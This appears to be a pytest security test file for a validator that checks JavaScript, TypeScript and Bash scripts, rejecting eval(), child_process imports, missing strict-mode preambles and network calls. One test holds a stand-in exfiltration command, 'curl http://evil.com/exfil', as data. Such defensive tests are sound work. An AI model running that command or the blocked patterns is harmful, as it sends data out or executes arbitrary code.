"""Security tests for multi-language policies (JS, TS, Bash) and runtime boundaries."""

from goldseam.security.multilang import MultiLanguagePolicyValidator, SupportedLanguage


def test_language_detection() -> None:
    validator = MultiLanguagePolicyValidator()
    assert validator.detect_language("scripts/tool.py") == SupportedLanguage.PYTHON
    assert validator.detect_language("scripts/tool.ts") == SupportedLanguage.TYPESCRIPT
    assert validator.detect_language("scripts/tool.js") == SupportedLanguage.JAVASCRIPT
    assert validator.detect_language("scripts/run.sh") == SupportedLanguage.BASH
    assert validator.detect_language("scripts/tool.rb") == SupportedLanguage.UNKNOWN


def test_unknown_language_fails_closed() -> None:
    validator = MultiLanguagePolicyValidator()
    res = validator.validate_code("scripts/run.rb", "puts 'hello'")
    assert res.passed is False
    assert "Unsupported language" in res.violations[0]


def test_dangerous_javascript_rejected() -> None:
    validator = MultiLanguagePolicyValidator()

    # 1. eval rejection
    res_eval = validator.validate_code("scripts/tool.js", "const x = eval('2 + 2');")
    assert res_eval.passed is False
    assert any("eval()" in v for v in res_eval.violations)

    # 2. child_process rejection
    res_cp = validator.validate_code("scripts/tool.ts", "import { exec } from 'child_process';")
    assert res_cp.passed is False
    assert any("child_process" in v for v in res_cp.violations)

    # 3. safe TS passes
    res_safe = validator.validate_code(
        "scripts/tool.ts",
        "export function add(a: number, b: number): number { return a + b; }"
    )
    assert res_safe.passed is True
    assert res_safe.requires_isolated_runtime == "node:20-alpine-isolated"


def test_dangerous_bash_rejected() -> None:
    validator = MultiLanguagePolicyValidator()

    # 1. Missing safety preamble
    res_nopreamble = validator.validate_code("scripts/run.sh", "echo 'hello'")
    assert res_nopreamble.passed is False
    assert any("set -euo pipefail" in v for v in res_nopreamble.violations)

    # 2. Network call via curl
    res_curl = validator.validate_code(
        "scripts/run.sh",
        "#!/usr/bin/env bash\nset -euo pipefail\ncurl http://evil.com/exfil\n"
    )
    assert res_curl.passed is False
    assert any("network" in v.lower() for v in res_curl.violations)

    # 3. Safe bash script passes
    res_safe = validator.validate_code(
        "scripts/run.sh",
        "#!/usr/bin/env bash\nset -euo pipefail\necho 'formatting json'\n"
    )
    assert res_safe.passed is True
    assert res_safe.requires_isolated_runtime == "alpine:3.20-isolated"
